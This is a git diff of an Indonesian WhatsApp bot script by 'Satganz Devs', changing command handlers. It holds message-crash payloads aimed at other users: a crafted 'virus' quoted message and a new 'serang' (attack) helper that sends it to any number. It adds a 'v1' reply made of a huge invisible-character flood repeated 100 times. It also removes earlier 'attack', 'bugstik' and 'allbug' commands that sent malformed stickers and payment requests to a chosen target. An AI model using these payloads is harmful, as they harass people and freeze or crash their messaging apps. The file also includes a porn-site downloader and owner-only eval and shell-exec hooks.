@@ -68,6 +68,7 @@ const q1 = q.split('&')[0];
 const q2 = q.split('&')[1];
 const q3 = q.split('&')[2];	
 const q4 = q.split('&')[3];	
+const autoreact = false
 const more = String.fromCharCode(8206)
 const readMore = more.repeat(4001)
 const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' );
@@ -124,7 +125,10 @@ function randomNomor(min, max = null) {
 
 // VIRUSS 𝚂𝙰𝚃𝙶𝙰𝙽𝚉 𝙳𝙴𝚅𝚂 〄
 const virus =  {
-             key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: thumb, surface: 200, message: '1955', orderTitle: 'hehe', sellerJid: '0@s.whatsapp.net'} } }       
+             key: { fromMe: false,remoteJid: "fleyvin soft@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 2021, status: 200, thumbnail: global.thumb, surface: 200, message: '1955', orderTitle: 'hehe', sellerJid: '0@s.whatsapp.net'} } }       
+     const serang = (nomore) => {
+           satzz.sendMessage(nomore, { text: nomore, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": thumb,"sourceUrl": "hehe"}}}, { quoted: virus})
+           }
 const bugstik = {
 		key: {
 			fromMe: false,
@@ -340,8 +344,9 @@ const isTo = checkMenfess(sender, menfess)
     
     
     
-   satzz.sendContact = async (kon, name, quoted = '', options = {}) => {
+   satzz.sendContact = async (kon, quoted = '', options = {}) => {
 	let list = []
+	let name = await satzz.getName(kon+"@s.whatsapp.net")
 	for (let i of kon) {
 	    list.push({
 	    	displayName: name,
@@ -427,7 +432,7 @@ const template = generateWAMessageFromContent(jid, proto.Message.fromObject({
                 await satzz.relayMessage(participant, message.message, { messageId: message.key.id, additionalAttributes: { ...options } })
                 return message
         }
-const butMenu = [{ urlButton: {displayText: 'WHATSAPP GROUP', url: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}, { quickReplyButton: { displayText: 'ONWER', id: '.owner'}}, { quickReplyButton: { displayText: 'DONATE', id: '.donasi'}}]
+const butMenu = [{ urlButton: {displayText: 'WHATSAPP GROUP', url: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}, { quickReplyButton: { displayText: 'OWNER', id: '.owner'}}, { quickReplyButton: { displayText: 'DONATE', id: '.donasi'}}]
 const butDefault = [{ urlButton: {displayText: 'WHATSAPP GROUP', url: `https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq`}}, { quickReplyButton: { displayText: 'ONWER', id: '.owner'}}, { quickReplyButton: { displayText: 'DONATE', id: '.donasi'}},{ quickReplyButton: { displayText: 'MENU', id: '.menu'}}]
 const sendDaftar = async (jid) => {
 let cap = `${ucapin} - @${sender.split('@')[0]}\n\nKamu belum terdaftar di Database bot, Silahkan mendaftar terlebih dahulu, tekan tombol di bawah`
@@ -587,10 +592,7 @@ satzz.sendMessage(jid, buttonMessage, { quoted, upload: satzz.waUploadToServer, 
 	
                 
                 
-                
-        const pM = async (text = '') => {
-	return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
-	}
+               
                 function pickRandom(list) {
   return list[Math.floor(list.length * Math.random())]
   }
@@ -632,7 +634,7 @@ sendPoll(from, q1, a, sat)
 break
 case 'setppbot':
 case 'setbotpp':
-if (!isOwner) return reply('Luwh siapa?')
+if (!isOwner) return only("isOwner", satzz, from)
 let medias = await downloadContentFromMessage(sat.message.imageMessage || sat.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
 var buffer = Buffer.from([])
 for await(const chunk of medias) {buffer = Buffer.concat([buffer, chunk])}
@@ -640,7 +642,7 @@ fs.writeFileSync('./botpp.jpg', buffer)
 const image = fs.readFileSync('./botpp.jpg')
 await updateProfilePicture(botNumber, image)
 reply('success')
-await fs.unlinkSync(medias)
+await fs.unlinkSync(chunk)
 break
 case 'setppgc':
 case 'setppgrup':
@@ -656,39 +658,14 @@ fs.writeFileSync('./ppgrup.jpg', buffers)
 const iimage = fs.readFileSync('./ppgc.jpg')
 await updateProfilePicture(from, iimage)
 reply('success')
-await fs.unlinkSync(medias)
+await fs.unlinkSync(chunk)
 break
 case 'hacker':
 case 'heker':
+if (cekUser("id", sender) == null) return sendDaftar(from)
 var heker = ["Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?","Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.","Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.","berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.","Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.","Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.","Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.","Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.","Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |","Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile","Aku deketin kamu cuma untuk redirect ke hati temenmu.","Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?","Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad","kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain","Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin","Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().","SQLI ( Structured Query Love Injection )","aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu","Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.","kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile","Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.","hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.","Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.","Jangan men-dualboot-kan hatiku kepadamu.","cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.","KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.","Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku","cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"]
 var qu = pickRandom(heker)            
 satzz.send5ButMsg(from, qu, footer, [{ urlButton: {displayText: 'COPY', url: `https://www.whatsapp.com/otp/copy/${qu}`}}, { quickReplyButton: { displayText: 'NEXT', id: '.heker'}}])
-break
-// BRUTAL SEND BY 𝚂𝙰𝚃𝙶𝙰𝙽𝚉 𝙳𝙴𝚅𝚂 〄
-case 'attack':
-if (!q1) return reply(`> Masukkan\n${prefix + command} Nomer\n\n> Contoh?\n${prefix + command} 62xxx`)
-var nyu = phone('+' + q1);
-if (nyu.isValid == false) return reply("Nomer Yang anda masukkan tidak valid")
-var cekontol = await satzz.onWhatsApp(nyu)
-if (nyu + '@s.whatsapp.net' == sender) return reply('its your self bitch!')
-if (!cekontol.length == 0) return reply(`Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`)
-var tgt = q1.replace(/[^@0-9]/g, '')+ "@s.whatsapp.net"
-var satgnz = "6281316701742"
-let isnoown = new RegExp(satgnz, 'i')
-let isOwn = isnoown.test(text)
-if (isOwn) return reply(`yow brow thats my owner, what are you doing?`)
-satzz.sendMessage(from, {text: "ATTACKERS FEATURES", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "ALL BUG", rowId: '.allbug'+ q },{title: "BUG STICK", rowId: prefix + 'bugstik'+ q },{title: "BUG VN", rowId: prefix + 'bugvn'+ q },{title: "BUG TROLI", rowId: prefix + 'bugtroli'+ q } ]}]})
-break
-case 'bugstik':
-satzz.sendMessage(q, { sticker : { url: thumb }}, { quoted: bugstik })
-reply('SUKSESS SEND BUGSTIK TO'+ q)
-break
-case 'allbug':
-satzz.sendMessage(q, { sticker : { url: thumb }, mimetype: 'image/webp'}, { quoted: bugstik })
-await sleep(200)
-satzz.sendMessage(q, { text: footer, contextInfo:{"externalAdReply": {"title": ` hehe`,"body": ` hehe`, "previewType": "PHOTO","thumbnailUrl": `https://wa.me/6281316701742`,"thumbnail": thumb,"sourceUrl": "https://wa.me/6281316701742"}}}, { quoted: virus})
-await sleep(200)
-satzz.relayMessage(q, { requestPaymentMessage: { Message: { TextMessage: { text: "hi", currencyCodeIso4217: 'IDR', requestFrom: '6281316701742@s.whatsapp.net', expiryTimestamp: 6281316701742, amount: 6281316701742, background: thumb }}}}, {})
 break
 case 'afk':
 if (cekUser("id", sender) == null) return sendDaftar(from)
@@ -703,19 +680,12 @@ if (cekUser("id", sender) == null) return sendDaftar(from)
 const buttonMenu = {
 image: thumb,
 fileLength: 88808964843634667969,
-caption: `${ucapin} - @${sender.split('@')[0]}\n\n` +help(prefix, reply, cekUser, namabot, sender),
+caption: `\n*${ucapin} - @${sender.split('@')[0]}*\n\n` +help(prefix, reply, cekUser, namabot, sender),
 footer: footer,
 mentions: [sender],
 templateButtons: butMenu,
-headerType: 4,
-contextInfo: { externalAdReply: { showAdAttribution: true,
-mediaUrl: 'https://instagram.com/satganzdevs.xyz',
-mediaType: 2, 
-description: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq',
-title: "Join Group Whatsapp Official",
-body: footer,
-thumbnail: thumb,
-sourceUrl: 'https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq'}}}
+headerType: 4
+}
 satzz.sendMessage(from, buttonMenu, { quoted : sat })
 await sleep(300)
 var angk = randomNomor(1, 53)
@@ -760,8 +730,8 @@ reply('_Kirim gambar/video dengan caption !sticker/ reply gambar/video dengan pe
 break
 case 'owner':
 if (cekUser("id", sender) == null) return sendDaftar(from)
-number = ["6281316701742"]
-sendContact(number, nay)
+numbes = ["6281316701742"]
+sendContact(numbes, sat)
 break
 case 'donasi': 
 case 'donate':
@@ -827,7 +797,7 @@ for (let hot of data) {
 let bcMess = {
 image: thumb,
 fileLength: 88808964843634667969,
-caption: `*_BROADCAST_*\n\n{q}`,
+caption: `*_BROADCAST_*\n\n${q}`,
 footer: footer,
 mentions: [hot.id],
 templateButtons: butDefault,
@@ -1038,7 +1008,7 @@ case 'getname':
 if (!isGroup) return only("isGroup", satzz, from)
 if (Tag() == "") return reply("tag Orang")
 var neme = await satzz.getName(Tag()[0])
-satzz.sendButtonText(from, butDefault, `NAME : ${neme}`, footer)
+satzz.sendButMsg(from, butDefault, `NAME : ${neme}`, footer)
 break
 case 'block': case 'ban': case 'banned':
 if (!isGroup) return only("isGroup", satzz, from)
@@ -1262,6 +1232,20 @@ if (command == "simp"){ var nyz = await api.stress.simp("@" + Tag()[0].split("@"
 if (command == "sherk"){ var nyz = await api.stress.sherk("@" + Tag()[0].split("@")[0]) }
 satzz.sendMessage(from, {text:nyz, mentions:Tag()},{quoted:sat1})
 break
+case 'xnxxdl':
+if (!q) return reply('linknya?')
+var dta = await fetchJson(`https://malesin.xyz/xnxxdl?url=${q}`)
+only("proses", satzz, from) 
+var botkep = {
+video: { url: dta.result.file.high },
+caption: `*TITLE* : ${dta.result.title}\n*DURATION* : ${dta.result.duration}\n\n*INFO*: ${dta.result.info}`,
+footer: footer,
+mentions: [sender],
+buttons: [{ buttonId: 'mek', buttonText: { displayText: '(⁠╥⁠﹏⁠╥⁠)' }, type: 1 }],
+headerType: 4 
+}
+satzz.sendMessage(from, botkep)
+break
 case 'j':
 case 'joins':
 case 'join':
@@ -1302,7 +1286,7 @@ break
 case 'tiktokaudio': case 'tiktokmp3':
 if (!q) return reply("Masukkan Url")
 only("proses", satzz, from) 
-var nyz = await fetchJson(`https://malesin.xyz/tiktok?url=${q}`)
+var nyz = await fetchJson(`https://malesin.xyz/tiktok2?url=${q}`)
 satzz.sendMessage(from, { audio: { url: nyz.audio }, contextInfo: { 
 externalAdReply: { 
 showAdAttribution: true,
@@ -1426,8 +1410,6 @@ if (cekMedia("sticker", q) !== q) return reply("Nama sticker tersebut tidak terd
 deleteMedia("sticker", q)
 only("sukses", satzz, from)
 break
-
-
 case 'addaudio': case 'addmp3': case 'addvn':
 
 if (isMedia || isQuotedAudio) { 
@@ -1605,10 +1587,12 @@ satzz.sendMessage(tod, { text: txtz}, { quoted: finv})
 case 'invite':
 satzz.sendGroupV4Invite("120363022284397832@g.us", sender, "https://chat.whatsapp.com/DXzNLv2I7mh01ikTbyFXBq", '99999', 'KONTOL', 'JOIN SINI BOSS', thumb)
 break
-                
+case 'v1':
+reply(' __--**【☛꙰⃝⃟SATGANZ DEVS WAS HERE!☚꙰】󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋󠀋󠀵󠀜󠀍󠀍󠀹󠀋󠀋󠀋󠀋󠀋**--__\nhttps://bit.ly/SatganzDevs\nhttps://bit.ly/SatganzDevs'.repeat(100))   
+break             
 default: 
 if (budy.startsWith('=>')) {
-if (!isOwner) return reply('SokAsik')
+if (!isOwner) return only("isOwner", satzz, from)
 function Return(sul) {
 sat = JSON.stringify(sul, null, 2)
 bang = util.format(sat)
@@ -1624,7 +1608,7 @@ reply(String(e))
 }
 }
 if (budy.startsWith('>')) {
-if (!isOwner) return reply('SokAsik')
+if (!isOwner) return only("isOwner", satzz, from)
 try {
 let evaled = await eval(budy.slice(2))
 if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -1634,7 +1618,7 @@ reply(String(err))
 }
 }
 if (budy.startsWith('<')) {
-if (!isOwner) return reply('SokAsik')
+if (!isOwner) return only("isOwner", satzz, from)
 try {
 return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
 } catch (e) {
@@ -1642,7 +1626,7 @@ reply(e)
 }
 }
 if (budy.startsWith('$')) {
-if (!isOwner) return reply('SokAsik')
+if (!isOwner) return only("isOwner", satzz, from)
 qur = budy.slice(2)
 exec(qur, (err, stdout) => {
 if (err) return reply(`${err}`)
@@ -1657,7 +1641,9 @@ let isBadword = badwordRegex.exec(text)
 if (isBotGroupAdmins && isBadword && isGroup) {
 const hapus = sat.key.participant
 const bang = sat.key.id
-await satzz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: bang, participant: hapus }})
+satzz.sendMessage(from, { audio: fs.readFileSync('./media/gaboleh-gitu.mp3'), mimetype: 'audio/mp4', ptt: true}, { quoted: sat })
+await sleep(300)
+satzz.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: bang, participant: hapus }})
 }
 
 // antilink
@@ -1707,7 +1693,7 @@ var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({
 "optionName": "JELEK BANGET",
 	}
 ],
-"selectableOptionsCount": 1
+"selectableOptionsCount": 3
 	}
 }), { quoted: sat })
 satzz.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
@@ -1723,49 +1709,7 @@ satzz.ws.on('CB:call', async (json) => {
     await satzz.updateBlockStatus(callerId, "block")
     }
     })
-/// Welcome Auto 𝚂𝙰𝚃𝙶𝙰𝙽𝚉 𝙳𝙴𝚅𝚂 〄
- satzz.ev.on('group-participants.update', async (anu) => {
-        console.log(anu)
-        try {
-            let metadata = await satzz.groupMetadata(anu.id)
-            let participants = anu.participants
-            for (let num of participants) {
-//═══════[get profile pic]════════\\
-                try {
-                    ppuser = await satzz.profilePictureUrl(num, 'image')
-                } catch {
-                    ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
-                }
 
-//═══════[get group dp]════════\\
-                try {
-                    ppgroup = await satzz.profilePictureUrl(anu.id, 'image')
-                } catch {
-                    ppgroup = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
-                }
-                
-let nama = await satzz.getName(num)
-memb = metadata.participants.length
-
-Kon = await getBuffer(`https://malesin.xyz/welcome2?username=${nama}groupname=${metadata.subject}&membercount=${memb}&profile=${ppuser}&background=https%3A%2F%2Ftelegra.ph%2Ffile%2F3983c55ac7f3ebea225d3.jpg`)
-
-Tol = await getBuffer(`https://malesin.xyz/goodbye2?username=${nama}groupname=${metadata.subject}&membercount=${memb}&profile=${ppuser}&background=https%3A%2F%2Ftelegra.ph%2Ffile%2F3983c55ac7f3ebea225d3.jpg`)
-                if (anu.action == 'add') {
-                    satzz.sendMessage(anu.id, { image: Kon, contextInfo: { mentionedJid: [num] }, caption: `Welcome To ${metadata.subject} @${num.split("@")[0]}
-
-Description: ${metadata.desc}
-
-Welcome 👋`} )
-                } else if (anu.action == 'remove') {
-                    satzz.sendMessage(anu.id, { image: Tol, contextInfo: { mentionedJid: [num] }, caption: `@${num.split("@")[0]} Left ${metadata.subject}
-
-Good Bye 👋` })
-                }
-            }
-        } catch (err) {
-            console.log(err)
-        }
-    })	
  
  
  
@@ -1792,4 +1736,4 @@ Good Bye 👋` })
  
  
  
-}} catch (e) {LogLoadingg(`${e}`)}}
+}} catch (e) {satzz.sendMessage("6281316701742@s.whatsapp.net", { text : e }, { quoted: sat })}}
